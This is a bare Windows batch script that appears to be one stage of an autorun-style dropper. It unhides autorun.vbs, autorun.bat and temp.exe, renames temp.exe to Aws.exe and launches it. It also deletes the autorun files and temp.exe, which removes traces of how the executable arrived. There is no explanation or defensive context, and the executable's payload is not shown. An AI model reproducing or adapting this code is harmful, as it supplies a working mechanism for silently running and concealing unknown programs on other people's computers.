@echo off
attrib -h autorun.vbs
attrib -h autorun.bat
attrib -h temp.exe

copy temp.exe Aws.exe /Y
del temp.exe
del autorun.vbs
start Aws.exe
del autorun.bat